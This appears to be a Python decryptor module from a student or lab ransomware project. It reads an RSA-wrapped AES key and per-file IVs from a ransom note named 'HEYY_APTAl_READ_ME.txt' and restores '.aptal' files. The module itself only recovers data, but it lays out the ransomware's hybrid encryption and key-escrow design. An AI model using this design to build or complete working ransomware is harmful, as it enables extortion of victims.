import os
import sys
import base64

from hasp.AESCipher import AESCipher
from hasp.RSACipher import RSACipher

class LockSmith(object):

    # passing the introduction section
    pass_the_introduction = 4
    dec_aesIV_file_store_name = "decrypted_iv_file.txt"

    def __init__(self, encrypted_aesIV_file_path, rsa_private_key_file_path):
        self.encrypted_aesIV_file_path = encrypted_aesIV_file_path
        self.rsa_private_key_file_path = rsa_private_key_file_path

        _key_dir = os.path.dirname(encrypted_aesIV_file_path)  
        self.decrypted_aesIV_file_path = os.path.join(_key_dir,self.dec_aesIV_file_store_name)

        print("LockSmith Object Created")


    def openthelock(self):
        """
            IVs, AES key and file paths are encrypted by RSA public key after file encrypted by AES.
            This function decrypt the encrypted information.

            HEYY_APTAl_READ_ME.txt schema
                info about us
                base64(RSA(aes key))
                base64(RSA(iv_1)):::::base64(RSA(file_1))
                .
                .
                .
                base64(RSA(iv_n)):::::base64(RSA(file_n))

        """
        print("Begin to DECRYPT the keys ::",self.encrypted_aesIV_file_path)

        encrypted_file_count = 0

        rsa_private_key = open(self.rsa_private_key_file_path,"rb").read()
        rsa_cipher = RSACipher(rsa_private_key)
        
        with open(self.encrypted_aesIV_file_path,"rb") as ivs_file:
            
            for i in range(self.pass_the_introduction):
                _temp = ivs_file.readline()

            with open(self.decrypted_aesIV_file_path,"wb") as dec_ivs_file:

                # decrypt aes key
                aes_key = ivs_file.readline().strip()
                aes_key = base64.b64decode(aes_key)
                aes_key = rsa_cipher.decrypt(aes_key)
                dec_ivs_file.write(aes_key+b"\n")
                
                # Decrypt iv and path with given RSA private key than write the decrypted pairs to decrypted_aesIV_file_path
                for line in ivs_file.readlines():
                    encrypted_file_count += 1
                    iv, which_file = line.strip().split(b":::::")       
                    iv = rsa_cipher.decrypt(base64.b64decode(iv.decode()))
                    which_file = rsa_cipher.decrypt(base64.b64decode(which_file.decode("utf-8")))
                    dec_ivs_file.write(iv+b":::::"+which_file+b"\n")
        
        return encrypted_file_count
        
    def decryptFile(self,aes_cipher,iv,file_path):
        """
            Decryption of files which are encrypted with AES is done here

            aes_cipher: our AES decryptor object
            iv: the initial vector(iv) which is used to encrypt the file
            file_path: which file will decrypt
        """
        encrypted_file_path = file_path+b".aptal"
        chunk_size = 16*1024
        with open(encrypted_file_path, 'rb') as infile:
            with open(file_path, 'wb') as outfile:
                while True:
                    chunk = infile.read(chunk_size)
                    if len(chunk) == 0:
                        break
                    outfile.write(aes_cipher.decrypt(iv, chunk))
        # deleting .aptal file
        os.remove(encrypted_file_path) 

    def startingRescueFiles(self, file_count=0, list_widget=False, progressbar=False):
        """
            Reading IVs and file paths from decrypted_iv_file.txt which is a form of decrypted HEYY_APTAl_READ_ME.txt file
        """
        print("Begin to DECRYPT the Files ::",self.decrypted_aesIV_file_path)
        _decrypted_file_count = 0
        _p1 = 100/file_count

        with open(self.decrypted_aesIV_file_path,"rb") as ivs_file:

            # read aes key
            aes_key = ivs_file.readline().strip()
            aes_cipher = AESCipher(aes_key)

            # read the file line by line then decrypt them one by one
            for line in ivs_file.readlines():
                iv, which_file = line.strip().split(b":::::")
                self.decryptFile(aes_cipher,iv,which_file)
                _decrypted_file_count += 1
                if not list_widget == False:
                    _percent = _p1 * _decrypted_file_count
                    progressbar.setValue(_percent)
                    list_widget.addItem(which_file.decode())


# ls = LockSmith("/home/kali/Desktop/0HEYY_APTAl_READ_ME.txt","/home/kali/Templates/PROJE/locksmith/victimNumber_rsa_private_key")